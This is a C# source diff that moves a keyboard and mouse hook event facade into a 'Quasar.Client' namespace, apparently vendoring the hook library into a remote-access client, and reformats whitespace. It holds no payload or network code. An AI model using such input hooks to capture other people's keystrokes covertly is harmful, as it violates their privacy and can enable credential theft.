@@ -5,7 +5,7 @@
 using System;
 using System.Windows.Forms;
 
-namespace Gma.System.MouseKeyHook.Implementation
+namespace Quasar.Client.MouseKeyHook.Implementation
 {
     internal abstract class EventFacade : IKeyboardMouseEvents
     {
@@ -24,19 +24,19 @@ namespace Gma.System.MouseKeyHook.Implementation
             remove { GetKeyListener().KeyPress -= value; }
         }
 
-	    public event EventHandler<KeyDownTxtEventArgs> KeyDownTxt
-	    {
-		    add { GetKeyListener().KeyDownTxt += value; }
-		    remove { GetKeyListener().KeyDownTxt -= value; }
-	    }
+        public event EventHandler<KeyDownTxtEventArgs> KeyDownTxt
+        {
+            add { GetKeyListener().KeyDownTxt += value; }
+            remove { GetKeyListener().KeyDownTxt -= value; }
+        }
 
-	    public event KeyEventHandler KeyUp
+        public event KeyEventHandler KeyUp
         {
             add { GetKeyListener().KeyUp += value; }
             remove { GetKeyListener().KeyUp -= value; }
         }
 
-	    public event MouseEventHandler MouseMove
+        public event MouseEventHandler MouseMove
         {
             add { GetMouseListener().MouseMove += value; }
             remove { GetMouseListener().MouseMove -= value; }
@@ -134,14 +134,17 @@ namespace Gma.System.MouseKeyHook.Implementation
 
         public void Dispose()
         {
-            if (m_MouseListenerCache != null) m_MouseListenerCache.Dispose();
-            if (m_KeyListenerCache != null) m_KeyListenerCache.Dispose();
+            if (m_MouseListenerCache != null)
+                m_MouseListenerCache.Dispose();
+            if (m_KeyListenerCache != null)
+                m_KeyListenerCache.Dispose();
         }
 
         private KeyListener GetKeyListener()
         {
             var target = m_KeyListenerCache;
-            if (target != null) return target;
+            if (target != null)
+                return target;
             target = CreateKeyListener();
             m_KeyListenerCache = target;
             return target;
@@ -150,7 +153,8 @@ namespace Gma.System.MouseKeyHook.Implementation
         private MouseListener GetMouseListener()
         {
             var target = m_MouseListenerCache;
-            if (target != null) return target;
+            if (target != null)
+                return target;
             target = CreateMouseListener();
             m_MouseListenerCache = target;
             return target;
